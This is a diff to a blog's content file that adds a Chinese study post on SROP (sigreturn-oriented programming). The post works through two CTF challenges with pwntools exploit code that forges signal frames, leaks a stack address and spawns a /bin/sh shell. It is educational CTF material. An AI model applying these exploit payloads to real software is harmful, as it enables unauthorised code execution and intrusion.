@@ -2384,7 +2384,7 @@ ERROR: Could not find ELF base!
 <p>​        signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。</p>
 <p>​        csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。</p>
 <p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png" data-caption="截屏2021-11-05 下午3.33.06" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png" alt="截屏2021-11-05 下午3.33.06"></a></p>
-<p>​            实际的信号不止这三十种。更加具体的可以看关于linux异常控制流的笔记。</p>
+<p>​            实际的信号不止这三十种。但是一般来说就是这些。</p>
 <h2 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h2><p><a href="https://blog.csdn.net/fjh1997/article/details/105434992">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>
 </body></html>]]></content>
       <tags>
@@ -2394,7 +2394,142 @@ ERROR: Could not find ELF base!
   <entry>
     <title>SROP学习</title>
     <url>/2021/11/07/srop%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<html><head></head><body><h2 id="1-前言">1)前言<a class="post-anchor" href="#1-前言"></a></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>
+<h2 id="2）SROP原理">2）SROP原理<a class="post-anchor" href="#2）SROP原理"></a></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>
+<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>
+<p>​        借一张图说明一下：</p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" data-caption="Process of Signal Handlering" data-fancybox="images"><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt="Process of Signal Handlering"></a></p>
+<h2 id="3）SROP利用">3）SROP利用<a class="post-anchor" href="#3）SROP利用"></a></h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>
+<h3 id="funsignal">funsignal<a class="post-anchor" href="#funsignal"></a></h3><p>​        题目地址： <a href="https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin">funsignals</a> </p>
+<p>​        打开题目，是手写汇编。</p>
+<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png" data-caption="截屏2021-11-09 下午3.36.29" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png" alt="截屏2021-11-09 下午3.36.29"></a></p>
+<p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read </code>, <code>sys_sigreturn</code>两个函数。</p>
+<p>​        那么很明显，<code>sys_read</code>用来栈溢出，然后 <code>sys_sigreturn</code>作为返回地址。并且flag的地址都已经给出，我们只需要通过<code>sys_write</code>读出flag的值就行。</p>
+<p>​        所以我们需要构造<code>sys_write</code>的调用</p>
+<pre><code class="python">frame = SigreturnFrame()
+frame.rax = constants.SYS_write#write函数的系统调用号
+frame.rdi = constants.STDOUT_FILENO#1
+frame.rsi = elf.symbols['flag']#0x010000023
+frame.rdx = 50#读取的字符数
+frame.rip = elf.symbols['syscall']
+</code></pre>
+<p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>
+<p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>
+<h3 id="Smallest-Pwn">Smallest Pwn<a class="post-anchor" href="#Smallest-Pwn"></a></h3><p>​        题目：<a href="https://buuoj.cn/challenges#360chunqiu2017_smallest">smallest pwn</a></p>
+<p>​        直接先在IDA中查看：</p>
+<pre><code class="asm">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:00000000004000B0                 xor     rax, rax
+.text:00000000004000B3                 mov     edx, 400h       ; count
+.text:00000000004000B8                 mov     rsi, rsp        ; buf
+.text:00000000004000BB                 mov     rdi, rax        ; fd
+.text:00000000004000BE                 syscall                ; LINUX - sys_read
+.text:00000000004000C0                 retn
+.text:00000000004000C0 start           endp
+.text:00000000004000C0
+.text:00000000004000C0 _text           ends
+.text:00000000004000C0
+.text:00000000004000C0
+.text:00000000004000C0                 end start
+</code></pre>
+<h4 id="ctf-wiki题解">ctf-wiki题解<a class="post-anchor" href="#ctf-wiki题解"></a></h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>
+<p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>
+<p>​        那么来看详细的分析</p>
+<p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>
+<p>​        顺便<code>sys_sigreturn</code>的返回值为119。</p>
+<p>​        然后看exp：</p>
+<pre><code class="python">payload = p64(start_addr) * 3
+sh.send(payload)
+
+## modify the return addr to start_addr+3
+## so that skip the xor rax,rax; then the rax=1
+## get stack addr
+sh.send('\xb3')
+stack_addr = u64(sh.recv()[8:16])
+log.success('leak stack addr :' + hex(stack_addr))
+</code></pre>
+<p>​        首先发送三次<code>start_addr</code>，第一次使得程序执行流重新回到start，但是在重新执行时输入<code>\xb3</code>    ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从<code>0x4000B3</code>开始。(第三个地址的作用会在后面体现)</p>
+<p>​    同时我们读入的<code>\xb3</code>    ,仅有一个字节，这使得<code>sys_read</code>的返回值为1，存在rax中，程序在这里就相当于执行了</p>
+<pre><code class="asm">mov     rax, 1
+mov     edx, 400h       ; count
+mov     rsi, rsp        ; buf
+mov     rdi, rax        ; fd
+syscall                ; LINUX - sys_write
+</code></pre>
+<p>所以此时相当于进行了一个系统调用号为1的系统调用,也就是<code>sys_write</code>函数。</p>
+<p>​    并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。</p>
+<p>​    回忆一下，srop的关键是通过<code>sys_sigreturn</code>来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。</p>
+<pre><code class="python">## make the rsp point to stack_addr
+## the frame is read(0,stack_addr,0x400)
+sigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的
+sigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号
+sigframe.rdi = 0#read参数
+sigframe.rsi = stack_addr#read参数，在栈上读入
+sigframe.rdx = 0x400#read参数，读多大
+sigframe.rsp = stack_addr#sigframe参数
+sigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址
+payload = p64(start_addr) + 'a' * 8 + str(sigframe)
+sh.send(payload)
+</code></pre>
+<p>​    接着我们开始构造<code>sys_sigreturn</code></p>
+<pre><code class="python">## set rax=15 and call sigreturn
+sigreturn = p64(syscall_ret) + 'b' * 7#读入15字节
+sh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.
+</code></pre>
+<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>    ,此时我们已经可以向用户栈中读入任意数据了。</p>
+<pre><code class="python">## call execv("/bin/sh",0,0)
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
+sigframe.rsi = 0x0
+sigframe.rdx = 0x0
+sigframe.rsp = stack_addr
+sigframe.rip = syscall_ret
+
+frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
+print len(frame_payload)
+payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
+sh.send(payload)
+sh.send(sigreturn)
+</code></pre>
+<p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>
+<p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute("/bin/sh")</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>
+<h4 id="自己的反思">自己的反思<a class="post-anchor" href="#自己的反思"></a></h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>
+<p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>
+<pre><code class="python">reread = 0x4000b0
+syscall = 0x4000be
+
+rereadaddr = p64(reread)
+syscalladdr = p64(syscall)
+
+context.clear()
+context.arch = "amd64"
+
+frame = SigreturnFrame()
+frame.rax = 59
+frame.rdi = 0x7fffffffe4e8
+frame.rip = syscall
+
+binsh='/bin/sh' 
+
+playload1 = rereadaddr+'a'*8+ str(frame)+binsh
+p.send(playload1)
+
+playload2 = syscalladdr+'a'*7
+
+p.send(playload2)
+#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/
+</code></pre>
+<p>​            </p>
+<p>​        可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。</p>
+<p>​        去查了一些资料，发现还是对于<code>SigreturnFrame()</code>的理解不够透彻。    </p>
+<p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>
+<p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>
+<p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>
+<h2 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>
+<h2 id="5）参考">5）参考<a class="post-anchor" href="#5）参考"></a></h2><p>​        </p>
+<p><a href="https://blog.csdn.net/qq_29343201/article/details/72627439">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>
+<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5">SROP</a></p>
+</body></html>]]></content>
       <tags>
         <tag>stack</tag>
       </tags>
